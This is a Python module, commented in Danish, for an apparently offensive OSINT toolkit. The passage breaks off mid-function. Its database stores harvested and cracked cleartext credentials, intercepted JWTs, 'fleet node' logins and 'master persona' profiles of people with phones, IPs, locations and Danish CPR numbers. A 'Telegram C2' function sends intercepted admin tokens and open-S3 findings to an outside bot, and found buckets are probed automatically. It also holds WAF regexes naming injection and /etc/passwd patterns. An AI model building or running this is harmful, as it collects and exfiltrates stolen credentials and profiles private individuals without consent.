#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🚀 OMNI_HUNTER - ULTIMATE OSINT Utility Module v6.5 (THE WAF & ASYNC EDITION)
📌 Purpose: Core utilities for OSINT, security, data persistence, and automation.
🔧 Features:
   - FASTSAT: bleach v6.0+ kompatibilitet løst.
   - Unicode Homoglyph Normalization (NFKC).
   - Indbygget OmniWAF (SQLi, XSS, Path Traversal, NoSQLi).
   - In-Memory Rate Limiter Engine (Thread-Safe).
   - Bulletproof Boot Sequence & Dynamic Auto-Heal.
   - Military-Grade Input Sanitization & PBKDF2 Encryption.
   - Deep Threat Intel Extraction & JWT Decoder.
   - PII Sanitizer & GDPR Redaction Engine.
   - Binary Forensics Engine & SQLite Data Lake.
   - Fejlfri OOP Caching Engine (Retter Linje 171 fejlen).
"""

import os
import sys
import json
import csv
import logging
import asyncio
import hashlib
import base64
import sqlite3
import re
import socket
import threading
import subprocess
import math
import binascii
import unicodedata
import time
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timedelta
from functools import lru_cache, wraps
from typing import List, Dict, Union, Optional, Any, Callable, Tuple, Set
from pathlib import Path

# ==========================================
# 🔹 1. ANSI STYLING & SESSION STATE
# ==========================================
class C:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    MAGENTA = '\033[95m'
    WHITE = '\033[97m'
    DIM = '\033[2m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    BG_RED = '\033[41m'
    RESET = '\033[0m'

def get_active_workspace() -> str:
    try:
        if os.path.exists("omni_active_workspace.txt"):
            with open("omni_active_workspace.txt", "r") as f:
                ws = f.read().strip()
                if ws: return f"workspaces/{ws}"
    except: pass
    return "workspaces/standard_sag"

session: Dict[str, Any] = {
    "name": "", 
    "city": "", 
    "email": "", 
    "phone": "",
    "username": "",
    "found_links": [],
    "loot_folder": get_active_workspace()
}

def get_input(prompt_text: str, session_key: str) -> str:
    val = input(f"{C.CYAN}{prompt_text}: {C.RESET}").strip()
    session[session_key] = val
    return val

# ==========================================
# 🔹 2. LOGGING ENGINE
# ==========================================
import structlog
structlog.configure(
    processors=[structlog.processors.JSONRenderer()],
    wrapper_class=structlog.make_filtering_bound_logger(logging.INFO)
)
logger = structlog.get_logger()

# ==========================================
# 🔹 3. RATE LIMITER & LOCAL WAF
# ==========================================
class RateLimiter:
    """In-memory rate limiter for at beskytte mod spam og DoS."""
    def __init__(self, calls: int, period: int):
        self.calls = calls
        self.period = period
        self.history: Dict[str, List[float]] = defaultdict(list)
        self.lock = threading.Lock()

    def is_allowed(self, identifier: str) -> bool:
        now = time.time()
        with self.lock:
            self.history[identifier] = [t for t in self.history[identifier] if now - t < self.period]
            if len(self.history[identifier]) >= self.calls:
                return False
            self.history[identifier].append(now)
            return True

class OmniWAF:
    """Lokal Web Application Firewall der opfanger ondsindede payloads før parsing."""
    SQLI_PATTERN = re.compile(r'(?i)(\b(UNION|SELECT|INSERT|UPDATE|DELETE|DROP|ALTER|EXEC)\b|--|;)')
    XSS_PATTERN = re.compile(r'(?i)(<script>|javascript:|onerror=|onload=|eval\()')
    PATH_TRAVERSAL = re.compile(r'(\.\./|\.\.\\|/etc/passwd|\\Windows\\System32)')
    NOSQL_PATTERN = re.compile(r'(?i)(\$gt|\$ne|\$where|\$regex)')
    
    _is_trained = False
    _vectorizer = None
    _centroid = None

    @classmethod
    def inspect(cls, payload: str) -> bool:
        if cls.SQLI_PATTERN.search(payload):
            logger.warning(f"OmniWAF: SQLi signature detected in payload: {payload[:50]}")
            raise ValueError("SQL Injection pattern detected.")
        if cls.XSS_PATTERN.search(payload):
            logger.warning(f"OmniWAF: XSS signature detected in payload: {payload[:50]}")
            raise ValueError("XSS pattern detected.")
        if cls.PATH_TRAVERSAL.search(payload):
            logger.warning(f"OmniWAF: Path Traversal detected in payload: {payload[:50]}")
            raise ValueError("Path Traversal pattern detected.")
        if cls.NOSQL_PATTERN.search(payload):
            logger.warning(f"OmniWAF: NoSQL Injection detected in payload: {payload[:50]}")
            raise ValueError("NoSQL Injection pattern detected.")
            
        # Machine Learning 0-Day Clustering (TF-IDF Distance)
        if has_sklearn:
            if not getattr(cls, '_is_trained', False):
                try:
                    corpus = ["admin", "john_doe", "test@test.com", "hvidovre", "12345678", "normal_user", "search_query"]
                    cls._vectorizer = TfidfVectorizer(analyzer='char', ngram_range=(1,3))
                    X = cls._vectorizer.fit_transform(corpus)
                    cls._centroid = np.mean(X.toarray(), axis=0)
                    cls._is_trained = True
                except Exception as e:
                    logger.error(f"OmniWAF ML Training Failed: {e}")
                    cls._is_trained = False
                    
            if getattr(cls, '_is_trained', False):
                try:
                    vec = cls._vectorizer.transform([payload]).toarray()
                    dist = np.linalg.norm(vec - cls._centroid)
                    if dist > 1.3: # Anomaligænse for skæve tegn
                        logger.critical(f"OmniWAF ML Anomaly: Zero-Day payload detected (Distance: {dist:.2f})")
                        raise ValueError("🚨 ML Anomaly / Zero-Day pattern detected.")
                except Exception: pass
                
        return True

# ==========================================
# 🔹 4. AUTO-HEAL DEPENDENCY SHIELD
# ==========================================
class DummyModule:
    def __init__(self, name: str):
        self._name = name

    def __getattr__(self, name: str) -> Callable:
        def _dummy_func(*args, **kwargs):
            logger.warning(f"Dummy fallback kaldt på manglende modul: {self._name}.{name}()")
            return {"error": f"Module '{self._name}' is missing. Feature disabled."}
        return _dummy_func
        
    def __bool__(self) -> bool:
        return False

def auto_install_package(pip_name: str) -> bool:
    print(f"{C.YELLOW}[*] AUTO-HEAL: Forsøger at installere manglende afhængighed '{pip_name}'...{C.RESET}")
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name], 
                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"{C.GREEN}    [+] Installation af {pip_name} fuldført!{C.RESET}")
        return True
    except subprocess.CalledProcessError:
        print(f"{C.RED}    [-] Auto-Heal fejlede for {pip_name}. Kør manuelt: pip install {pip_name}{C.RESET}")
        return False

def safe_import(module_name: str, pip_name: Optional[str] = None) -> Any:
    try:
        if "." in module_name:
            components = module_name.split('.')
            mod = __import__(module_name, fromlist=[components[-1]])
            return mod
        return __import__(module_name)
    except ImportError:
        target_pip = pip_name or module_name
        logger.warning(f"Missing dependency: {module_name}. Engaging Auto-Heal protocol.")
        if auto_install_package(target_pip):
            try:
                if "." in module_name:
                    components = module_name.split('.')
                    return __import__(module_name, fromlist=[components[-1]])
                return __import__(module_name)
            except ImportError: pass
        return DummyModule(module_name)

# --- UDFØRER SIKRE IMPORTS ---
import requests
import bleach
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from bs4 import BeautifulSoup
from dotenv import load_dotenv

try:
    from pydantic import BaseModel, field_validator as validator, ValidationError, Field
except ImportError:
    from pydantic import BaseModel, validator, ValidationError, Field

dns = safe_import('dns.resolver', 'dnspython')
whois = safe_import('whois', 'python-whois')
shodan = safe_import('shodan')
censys = safe_import('censys.search', 'censys')
netifaces = safe_import('netifaces')
Image = safe_import('PIL.Image', 'pillow')
ExifTags = safe_import('PIL.ExifTags', 'pillow')
pytesseract = safe_import('pytesseract')
pd = safe_import('pandas')
np = safe_import('numpy')

try:
    from sklearn.feature_extraction.text import TfidfVectorizer
    from sklearn.cluster import KMeans
    has_sklearn = True
except ImportError:
    logger.warning("Missing sklearn. AI Clustering disabled.")
    has_sklearn = False

# ==========================================
# 🔹 5. SYSTEM INITIALIZATION & FEJLFRI CACHE
# ==========================================
load_dotenv()

class OmniCacheManager:
    """Fejlfri og sikker OOP-baseret HTTP Caching Engine."""
    @staticmethod
    def init_cache() -> None:
        try:
            import requests_cache
            requests_cache.install_cache(
                "omni_hunter_cache_v6",
                expire_after=3600,
                allowable_methods=["GET", "POST"],
                allowable_codes=[200, 404],
                stale_if_error=True,
                backend="sqlite",
                use_temp=False
            )
            logger.info("Requests Cache successfully initialized.")
        except ImportError:
            logger.warning("requests_cache ikke installeret. Fortsætter uden cache.")
        except Exception as e:
            logger.error(f"Cache engine fejl: {e}")

OmniCacheManager.init_cache()

SHODAN_API_KEY = os.getenv("SHODAN_API_KEY")
CENSYS_API_ID = os.getenv("CENSYS_API_ID")
CENSYS_API_SECRET = os.getenv("CENSYS_API_SECRET")

shodan_client = shodan.Shodan(SHODAN_API_KEY) if bool(shodan) and SHODAN_API_KEY else None
if bool(censys) and CENSYS_API_ID and CENSYS_API_SECRET:
    try:
        from censys.search import CensysHosts
        censys_client = CensysHosts(api_id=CENSYS_API_ID, api_secret=CENSYS_API_SECRET)
    except Exception:
        censys_client = None
else:
    censys_client = None

# ==========================================
# 🔹 6. SECURITY, CRYPTO & OPSEC
# ==========================================
class MilitarySafeInput(BaseModel):
    query: str = Field(..., max_length=1000)
    
    @validator("query", mode='before')
    def military_sanitize(cls, v: str) -> str:
        normalized = unicodedata.normalize('NFKC', str(v))
        OmniWAF.inspect(normalized)
        sanitized = bleach.clean(normalized, tags=[], strip=True, attributes={}, strip_comments=True)
        sanitized = re.sub(r"[^a-zA-Z0-9\-._@ ]", "", sanitized)
        if len(sanitized) > 1000: raise ValueError("Input too long!")
        return sanitized

def military_sanitize_input(user_input: str) -> str:
    try:
        validated = MilitarySafeInput(query=user_input)
        return validated.query
    except ValidationError as e:
        logger.critical("MILITARY SECURITY BREACH ATTEMPT DETECTED", error=str(e))
        raise ValueError("🚨 SECURITY ALERT: Invalid or malicious input detected!")

class AdvancedCrypto:
    def __init__(self, master_password: Optional[str] = None):
        self.key_file = Path("omni_crypto.key")
        self.key = self._initialize_key(master_password)
        self.cipher = Fernet(self.key)

    def _initialize_key(self, password: Optional[str]) -> bytes:
        if password:
            salt = b'omni_hunter_salt_x99'
            kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=480000)
            return base64.urlsafe_b64encode(kdf.derive(password.encode()))
        
        if self.key_file.exists(): 
            return self.key_file.read_bytes()
        else:
            new_key = Fernet.generate_key()
            self.key_file.write_bytes(new_key)
            return new_key

    def encrypt(self, data: str) -> str: 
        return self.cipher.encrypt(data.encode()).decode()
        
    def decrypt(self, encrypted_data: Union[str, bytes]) -> str:
        if isinstance(encrypted_data, str): 
            encrypted_data = encrypted_data.encode()
        return self.cipher.decrypt(encrypted_data).decode()

crypto = AdvancedCrypto(master_password=os.getenv("OMNI_MASTER_PASSWORD"))

def sanitize_filename(name: str) -> str:
    return re.sub(r'[\\/*?:"<>|]', "", str(name)).replace(" ", "_")[:50]

class PIISanitizer:
    @staticmethod
    def redact_pii(text: str) -> str:
        text = re.sub(r'\b(?:0[1-9]|[12][0-9]|3[01])(?:0[1-9]|1[0-2])\d{2}[- ]?\d{4}\b', '[REDACTED_CPR]', text)
        text = re.sub(r'\b[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z]{2,10}\b', '[REDACTED_EMAIL]', text)
        text = re.sub(r'\b(?:\d[ -]*?){13,16}\b', '[REDACTED_CC]', text)
        return text

# GOLIATH EXPANSION: S3 Bucket Vulnerability Inspector
class S3BucketInspector:
    @staticmethod
    def check_exposure(bucket_url: str) -> bool:
        """Tjekker stealthy om en fundet S3 bucket er offentligt læsbar."""
        if not bucket_url.startswith("http"):
            bucket_url = f"https://{bucket_url}"
        try:
            import requests
            res = requests.get(bucket_url, timeout=5)
            # En åben bucket returnerer typisk 200 OK med XML der indeholder ListBucketResult
            if res.status_code == 200 and "ListBucketResult" in res.text:
                return True
        except Exception: pass
        return False

# GOLIATH EXPANSION: Telegram C2 Alerting System
def send_telegram_alert(target: str, token_snippet: str, payload_str: str):
    bot_token = os.getenv("TELEGRAM_BOT_TOKEN")
    chat_id = os.getenv("TELEGRAM_CHAT_ID")
    if bot_token and chat_id:
        msg = f"🚨 *GOLIATH HVT ALERT* 🚨\n\n*Target:* `{target}`\n*Admin JWT Intercepted!*\n\n*Token:* `{token_snippet}...`\n*Payload:* ```json\n{payload_str}\n```"
        try:
            import requests
            requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", 
                          json={"chat_id": chat_id, "text": msg, "parse_mode": "Markdown"}, timeout=5)
        except Exception as e:
            logger.error(f"Kunne ikke sende Telegram alarm: {e}")

# ==========================================
# 🔹 7. ADVANCED THREAT INTEL EXTRACTION
# ==========================================
class ThreatIntelExtractor:
    PATTERNS = {
        "email": re.compile(r'\b[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z]{2,10}\b'),
        "ipv4": re.compile(r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b'),
        "ipv6": re.compile(r'\b(?:[a-fA-F0-9]{1,4}:){7}[a-fA-F0-9]{1,4}\b'),
        "mac": re.compile(r'\b(?:[0-9A-Fa-f]{2}[:-]){5}(?:[0-9A-Fa-f]{2})\b'),
        "md5": re.compile(r'\b[A-Fa-f0-9]{32}\b', re.IGNORECASE),
        "sha256": re.compile(r'\b[A-Fa-f0-9]{64}\b', re.IGNORECASE),
        "crypto_btc": re.compile(r'\b(?:bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}\b'),
        "crypto_eth": re.compile(r'\b0x[a-fA-F0-9]{40}\b'),
        "crypto_xmr": re.compile(r'\b4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}\b'),
        "onion_v3": re.compile(r'\b[a-z2-7]{56}\.onion\b'),               
        "aws_key": re.compile(r'\bAKIA[0-9A-Z]{16}\b'),                   
        "discord_token": re.compile(r'\b[\w-]{24}\.[\w-]{6}\.[\w-]{27}\b'),
        "slack_webhook": re.compile(r'https://hooks\.slack\.com/services/T[a-zA-Z0-9_]+/B[a-zA-Z0-9_]+/[a-zA-Z0-9_]+'),
        "s3_bucket": re.compile(r'(?:http[s]?://)?(?:[a-zA-Z0-9_-]+)\.s3(?:-[a-z0-9-]+)?\.amazonaws\.com'),
        "danish_cpr": re.compile(r'\b(?:0[1-9]|[12][0-9]|3[01])(?:0[1-9]|1[0-2])\d{2}[- ]?\d{4}\b'),
        "danish_cvr": re.compile(r'\b[1-9]\d{7}\b'),
        "iban": re.compile(r'\b[A-Z]{2}[0-9]{2}(?:[ ]?[0-9]{4}){4}(?!(?:[ ]?[0-9]){3})(?:[ ]?[0-9]{1,2})?\b'),
        "credit_card": re.compile(r'\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|6(?:011|5[0-9]{2})[0-9]{12}|(?:2131|1800|35\d{3})\d{11})\b')
    }

    @classmethod
    def extract_all(cls, text: str) -> Dict[str, List[str]]:
        results = {}
        for key, pattern in cls.PATTERNS.items():
            matches = list(set(pattern.findall(text)))
            if matches: results[key] = matches
        return results

    @staticmethod
    def extract_danish_phones(text: str, validate: bool = False) -> Set[str]:
        pattern = r'(?:(?:\+45|0045)\s?)?(?:[2-9][0-9]\s?[0-9]{2}\s?[0-9]{2}\s?[0-9]{2})'
        raw_matches = re.findall(pattern, text)
        clean_phones = set()
        for m in raw_matches:
            num = re.sub(r'\D', '', m)
            if len(num) == 8: clean_phones.add(num)
            elif len(num) == 10 and num.startswith('45'): clean_phones.add(num[2:])
        return clean_phones

class JWTExtractor:
    JWT_PATTERN = re.compile(r'\b(ey[a-zA-Z0-9_-]+\.ey[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+)\b')

    @classmethod
    def decode_payload(cls, token: str) -> Optional[Dict]:
        try:
            parts = token.split('.')
            if len(parts) != 3: return None
            payload_b64 = parts[1]
            padded = payload_b64 + '=' * (4 - len(payload_b64) % 4)
            decoded_bytes = base64.urlsafe_b64decode(padded)
            return json.loads(decoded_bytes.decode('utf-8'))
        except Exception:
            return None

    @classmethod
    def extract_and_decode(cls, text: str) -> List[Dict[str, Any]]:
        tokens = list(set(cls.JWT_PATTERN.findall(text)))
        results = []
        for token in tokens:
            payload = cls.decode_payload(token)
            if payload:
                results.append({"token": token[:30] + "...", "payload": payload})
        return results

def extract_iocs(text: str) -> Dict[str, List[str]]:
    return ThreatIntelExtractor.extract_all(text)

# ==========================================
# 🔹 8. DATA LAKE EXPORTER & ANALYTICS
# ==========================================
class OmniDataLake:
    def __init__(self, base_dir: str = "loot_evidence"):
        self.base_dir = Path(base_dir)
        self.base_dir.mkdir(parents=True, exist_ok=True)
        self._init_db()

    @property
    def db_path(self) -> Path:
        """Dynamisk Path resolution sikrer, at alle moduler skriver til det aktive workspace."""
        active_dir = Path(session.get("loot_folder", get_active_workspace()))
        active_dir.mkdir(parents=True, exist_ok=True)
        return active_dir / "omni_datalake.db"

    def _init_db(self) -> None:
        with sqlite3.connect(self.db_path) as conn:
            conn.execute('''CREATE TABLE IF NOT EXISTS osint_records
                            (id INTEGER PRIMARY KEY AUTOINCREMENT, 
                             timestamp DATETIME,
                             source_module TEXT,
                             target TEXT,
                             data_json TEXT)''')
            conn.execute('CREATE INDEX IF NOT EXISTS idx_target ON osint_records(target)')
            
            # GOLIATH EXPANSION: Entity Extraction Tables (V48)
            conn.execute('''CREATE TABLE IF NOT EXISTS extracted_emails
                            (id INTEGER PRIMARY KEY AUTOINCREMENT, timestamp DATETIME, source_module TEXT, target TEXT, email TEXT)''')
            conn.execute('''CREATE TABLE IF NOT EXISTS extracted_credentials
                            (id INTEGER PRIMARY KEY AUTOINCREMENT, timestamp DATETIME, source_module TEXT, target TEXT, username TEXT, password TEXT)''')
            conn.execute('''CREATE TABLE IF NOT EXISTS extracted_apis
                            (id INTEGER PRIMARY KEY AUTOINCREMENT, timestamp DATETIME, source_module TEXT, target TEXT, endpoint TEXT, method TEXT)''')
            conn.execute('''CREATE TABLE IF NOT EXISTS harvested_data
                            (id INTEGER PRIMARY KEY AUTOINCREMENT, timestamp DATETIME, source_module TEXT, target TEXT, endpoint TEXT, payload TEXT)''')
            conn.execute('''CREATE TABLE IF NOT EXISTS intercepted_jwts
                            (id INTEGER PRIMARY KEY AUTOINCREMENT, timestamp DATETIME, source_module TEXT, target TEXT, token TEXT, payload TEXT)''')
            conn.execute('''CREATE TABLE IF NOT EXISTS master_personas
                            (id INTEGER PRIMARY KEY AUTOINCREMENT, timestamp DATETIME, target TEXT, name TEXT, email TEXT, phone TEXT, social_handle TEXT, raw_data_ref TEXT, last_ip TEXT, location TEXT)''')
            
            # GOLIATH V53: Real-time Alert Engine Tabeller
            conn.execute('''CREATE TABLE IF NOT EXISTS watchlist
                            (id INTEGER PRIMARY KEY AUTOINCREMENT, keyword TEXT, type TEXT, added_at DATETIME)''')
            conn.execute('''CREATE TABLE IF NOT EXISTS security_alerts
                            (id INTEGER PRIMARY KEY AUTOINCREMENT, timestamp DATETIME, source_module TEXT, target TEXT, keyword TEXT, snippet TEXT, is_read BOOLEAN DEFAULT 0)''')
                            
            # GOLIATH V56: Peer-Review & Validation
            conn.execute('''CREATE TABLE IF NOT EXISTS persona_reviews
                            (id INTEGER PRIMARY KEY AUTOINCREMENT, persona_id INTEGER, operator_name TEXT, comment TEXT, rating INTEGER, timestamp DATETIME)''')
                            
            # GOLIATH V57: Discovered Vulnerabilities
            conn.execute('''CREATE TABLE IF NOT EXISTS discovered_vulnerabilities
                            (id INTEGER PRIMARY KEY AUTOINCREMENT, persona_id INTEGER, port INTEGER, service_banner TEXT, vulnerability_name TEXT, severity TEXT, timestamp DATETIME)''')
                            
            # GOLIATH V58: Fleet Management Nodes
            conn.execute('''CREATE TABLE IF NOT EXISTS fleet_nodes
                            (id INTEGER PRIMARY KEY AUTOINCREMENT, ip TEXT UNIQUE, username TEXT, password TEXT, status TEXT, last_seen DATETIME)''')

            conn.execute('CREATE INDEX IF NOT EXISTS idx_email ON extracted_emails(email)')
            conn.execute('CREATE INDEX IF NOT EXISTS idx_cred_user ON extracted_credentials(username)')
            conn.execute('CREATE INDEX IF NOT EXISTS idx_api ON extracted_apis(endpoint)')
            conn.execute('CREATE INDEX IF NOT EXISTS idx_harvest_target ON harvested_data(target)')
            conn.execute('CREATE INDEX IF NOT EXISTS idx_jwt_target ON intercepted_jwts(target)')
            
            # GOLIATH V52 Auto-Heal Migration: Tilføj kolonner hvis tabellen allerede findes fra Batch 11
            try:
                conn.execute("ALTER TABLE master_personas ADD COLUMN last_ip TEXT")
                conn.execute("ALTER TABLE master_personas ADD COLUMN location TEXT")
            except sqlite3.OperationalError:
                pass # Kolonnerne eksisterer allerede
                
            # GOLIATH V56 Auto-Heal Migration: Confidence Scoring
            try:
                conn.execute("ALTER TABLE master_personas ADD COLUMN confidence_score INTEGER DEFAULT 0")
                conn.execute("ALTER TABLE master_personas ADD COLUMN is_verified BOOLEAN DEFAULT 0")
            except sqlite3.OperationalError:
                pass # Kolonnerne eksisterer allerede

            # --- BATCH 22: FTS5 FULL-TEXT SEARCH INDEX ---
            conn.execute('''CREATE VIRTUAL TABLE IF NOT EXISTS global_search_index USING fts5(
                            source_table, 
                            entity_id, 
                            search_text)''')

    def ingest(self, source_module: str, target: str, data: Dict[str, Any]) -> None:
        timestamp = datetime.now().isoformat()
        
        # HVT Alert Interception (GOLIATH V53)
        try:
            with sqlite3.connect(self.db_path) as conn:
                cursor = conn.execute("SELECT keyword FROM watchlist")
                watchlist_items = [row[0].lower() for row in cursor.fetchall()]
                
                if watchlist_items:
                    payload_str = json.dumps(data, ensure_ascii=False).lower()
                    for w in watchlist_items:
                        if w in payload_str:
                            snippet = (payload_str[:150] + '...') if len(payload_str) > 150 else payload_str
                            conn.execute("INSERT INTO security_alerts (timestamp, source_module, target, keyword, snippet) VALUES (?, ?, ?, ?, ?)",
                                         (timestamp, source_module, target, w, snippet))
                            # IPC Trigger til WebSocket Dæmonen
                            pipe_path = Path("logs/ws_alerts.pipe")
                            pipe_path.parent.mkdir(exist_ok=True)
                            with open(pipe_path, "a", encoding="utf-8") as f:
                                f.write(json.dumps({"type": "HVT_HIT", "keyword": w, "module": source_module, "target": target}) + "\n")
        except Exception as e:
            logger.error(f"Fejl i HVT Interception: {e}")

        with sqlite3.connect(self.db_path) as conn:
            osint_cursor = conn.execute("INSERT INTO osint_records (timestamp, source_module, target, data_json) VALUES (?, ?, ?, ?)",
                                        (timestamp, source_module, target, json.dumps(data, ensure_ascii=False)))
            conn.execute("INSERT INTO global_search_index (source_table, entity_id, search_text) VALUES (?, ?, ?)",
                         ('osint_records', osint_cursor.lastrowid, json.dumps(data, ensure_ascii=False)))
                         
            # --- GOLIATH ADVANCED ENTITY EXTRACTION ---
            try:
                emails = set()
                for key in ["Fundne_Emails", "Deep_Scrape_Emails", "Emails_Identificeret"]:
                    if key in data and isinstance(data[key], list):
                        for e in data[key]:
                            if isinstance(e, str): emails.add(e)
                            elif isinstance(e, dict) and "Email" in e: emails.add(e["Email"])
                
                for e in emails:
                    email_cursor = conn.execute("INSERT INTO extracted_emails (timestamp, source_module, target, email) VALUES (?, ?, ?, ?)",
                                                (timestamp, source_module, target, e))
                    conn.execute("INSERT INTO global_search_index (source_table, entity_id, search_text) VALUES (?, ?, ?)",
                                 ('extracted_emails', email_cursor.lastrowid, str(e)))

                creds = []
                if "Credentials" in data and isinstance(data["Credentials"], list):
                    for c in data["Credentials"]:
                        if isinstance(c, dict): creds.append((c.get("Konto", "Unknown"), c.get("Secret", "")))
                        
                for key in ["Rå_Kredentialer", "Lækkede_Kredentialer"]:
                    if key in data and isinstance(data[key], list):
                        for c in data[key]:
                            if isinstance(c, str) and ":" in c:
                                u, p = c.split(":", 1)
                                creds.append((u, p))
                                
                if "Knækkede_Passwords_Klartekst" in data and isinstance(data["Knækkede_Passwords_Klartekst"], list):
                    for c in data["Knækkede_Passwords_Klartekst"]:
                        if isinstance(c, dict):
                            creds.append((c.get("Hash", "Unknown")[:16], c.get("Cleartext", c.get("Plaintext", ""))))

                for u, p in creds:
                    if u and p:
                        cred_cursor = conn.execute("INSERT INTO extracted_credentials (timestamp, source_module, target, username, password) VALUES (?, ?, ?, ?, ?)",
                                                   (timestamp, source_module, target, str(u), str(p)))
                        conn.execute("INSERT INTO global_search_index (source_table, entity_id, search_text) VALUES (?, ?, ?)",
                                     ('extracted_credentials', cred_cursor.lastrowid, f"{u} {p}"))
                                     
                # GOLIATH EXPANSION: JWT Token Ingestion
                # Fanger tokens uanset om de ligger direkte i root eller under 'osint' (fra The Apex Browser)
                jwt_list = data.get("intercepted_jwts", data.get("osint", {}).get("intercepted_jwts", []))
                if isinstance(jwt_list, list):
                    for jwt_obj in jwt_list:
                        if isinstance(jwt_obj, dict):
                            t_str = str(jwt_obj.get("token", ""))
                            p_str = json.dumps(jwt_obj.get("payload", {}), ensure_ascii=False)
                            conn.execute("INSERT INTO intercepted_jwts (timestamp, source_module, target, token, payload) VALUES (?, ?, ?, ?, ?)",
                                         (timestamp, source_module, target, t_str, p_str))
                                         
                            # GOLIATH TRIGGER: Telegram Admin Alert
                            p_lower = p_str.lower()
                            if '"admin": true' in p_lower or '"role": "admin"' in p_lower:
                                threading.Thread(target=send_telegram_alert, args=(target, t_str[:30], p_str), daemon=True).start()

                # GOLIATH EXPANSION: Auto-S3 Bucket Hunting i netværks-JSON
                payload_str = json.dumps(data, ensure_ascii=False)
                s3_matches = ThreatIntelExtractor.PATTERNS["s3_bucket"].findall(payload_str)
                if s3_matches:
                    for bucket in set(s3_matches):
                        def verify_s3(b_url, t_target):
                            if S3BucketInspector.check_exposure(b_url):
                                msg = f"⚠️ KRITISK: Åben S3 Bucket detekteret i API svar: {b_url}"
                                with sqlite3.connect(self.db_path) as c:
                                    c.execute("INSERT INTO security_alerts (timestamp, source_module, target, keyword, snippet) VALUES (?, ?, ?, ?, ?)", (datetime.now().isoformat(), source_module, t_target, 'Open_S3_Bucket', msg))
                                send_telegram_alert(t_target, "S3 DATA LEAK", msg)
                        threading.Thread(target=verify_s3, args=(bucket, target), daemon=True).start()

                # API Endpoint Extraction for SPA Recon
                if "Intercepted_APIs" in data and isinstance(data["Intercepted_APIs"], list):
                    for api in data["Intercepted_APIs"]:
                        if isinstance(api, dict) and api.get("endpoint"):
                            conn.execute("INSERT INTO extracted_apis (timestamp, source_module, target, endpoint, method) VALUES (?, ?, ?, ?, ?)",
                                         (timestamp, source_module, target, api.get("endpoint"), api.get("method", "GET")))
                                         
                # Mass Harvest Extraction for Batch 10
                if "Harvested_Payloads" in data and isinstance(data["Harvested_Payloads"], list):
                    for payload_data in data["Harvested_Payloads"]:
                        if isinstance(payload_data, dict):
                            conn.execute("INSERT INTO harvested_data (timestamp, source_module, target, endpoint, payload) VALUES (?, ?, ?, ?, ?)",
                                         (timestamp, source_module, target, payload_data.get("url", ""), json.dumps(payload_data.get("payload", {}), ensure_ascii=False)))
                                         
                # Master Persona Ingestion for Batch 11
                if "Master_Personas" in data and isinstance(data["Master_Personas"], list):
                    for p in data["Master_Personas"]:
                        if isinstance(p, dict):
                            raw_ref = p.get("raw_data_ref", "")
                            last_ip = p.get("last_ip", "")
                            location = p.get("location", "")
                            
                            # Heuristisk Geo-Extraction (Batch 12)
                            if not last_ip and raw_ref:
                                ip_match = re.search(r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b', raw_ref)
                                if ip_match: last_ip = ip_match.group(0)
                            if not location and raw_ref:
                                coord_match = re.search(r'("lat"|"latitude"|lat|latitude)[\s:"]+([-+]?[0-9]*\.?[0-9]+).*?("lon"|"lng"|"longitude"|lon|lng|longitude)[\s:"]+([-+]?[0-9]*\.?[0-9]+)', raw_ref, re.IGNORECASE)
                                if coord_match: location = f"{coord_match.group(2)}, {coord_match.group(4)}"
                                
                            persona_cursor = conn.execute("INSERT INTO master_personas (timestamp, target, name, email, phone, social_handle, raw_data_ref, last_ip, location) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)",
                                                          (timestamp, target, p.get("name", ""), p.get("email", ""), p.get("phone", ""), p.get("social_handle", ""), raw_ref, last_ip, location))
                            search_blob = f"{p.get('name', '')} {p.get('email', '')} {p.get('phone', '')} {p.get('social_handle', '')} {last_ip} {location}"
                            conn.execute("INSERT INTO global_search_index (source_table, entity_id, search_text) VALUES (?, ?, ?)",
                                         ('master_personas', persona_cursor.lastrowid, search_blob))
                                         
                # Active Service Prober Ingestion for Batch 17
                if "Discovered_Vulns" in data and isinstance(data["Discovered_Vulns"], list):
                    for v in data["Discovered_Vulns"]:
                        conn.execute("INSERT INTO discovered_vulnerabilities (persona_id, port, service_banner, vulnerability_name, severity, timestamp) VALUES (?, ?, ?, ?, ?, ?)",
                                     (v.get("persona_id"), v.get("port"), v.get("banner"), v.get("vuln"), v.get("severity"), timestamp))
            except Exception as e:
                logger.error(f"Fejl ved Entity Extraction til Datalake: {e}")

    def purge_ephemeral_html(self, retention_days: int = 7) -> None:
        """
        GOLIATH AUTO-PURGE: Rydder automatisk tunge HTML strenge fra databasen for records ældre end X dage.
        OSINT metadata bevares intakt. Sletter også bloat fra FTS5 indekset.
        """
        try:
            cutoff_date = (datetime.now() - timedelta(days=retention_days)).isoformat()
            with sqlite3.connect(self.db_path) as conn:
                cursor = conn.execute("SELECT id, data_json FROM osint_records WHERE timestamp < ? AND data_json LIKE '%html%'", (cutoff_date,))
                records = cursor.fetchall()
                purged_count = 0
                
                for row_id, data_json in records:
                    try:
                        parsed = json.loads(data_json)
                        modified = False
                        for heavy_key in ["html", "raw_html_snippet", "full_page_source"]:
                            if heavy_key in parsed:
                                parsed[heavy_key] = "[REDACTED_BY_7_DAY_RETENTION_POLICY]"
                                modified = True
                        
                        if modified:
                            clean_json = json.dumps(parsed, ensure_ascii=False)
                            conn.execute("UPDATE osint_records SET data_json = ? WHERE id = ?", (clean_json, row_id))
